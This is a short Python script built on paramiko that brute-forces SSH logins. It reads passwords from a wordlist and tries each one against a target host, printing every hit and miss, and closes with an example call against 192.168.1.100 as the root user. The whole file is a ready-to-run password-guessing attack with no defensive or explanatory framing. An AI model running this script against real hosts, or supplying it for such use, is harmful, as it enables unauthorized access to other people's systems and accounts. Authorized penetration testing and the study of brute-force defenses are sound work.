import paramiko

def ssh_bruteforce(target_ip, username, password_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(password_file, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        try:
            ssh.connect(target_ip, username=username, password=password, timeout=3)
            print(f"[+] Password Found: {password}")
            ssh.close()
            return
        except:
            print(f"[-] Failed: {password}")

# Example usage
ssh_bruteforce("192.168.1.100", "root", "passwords.txt")
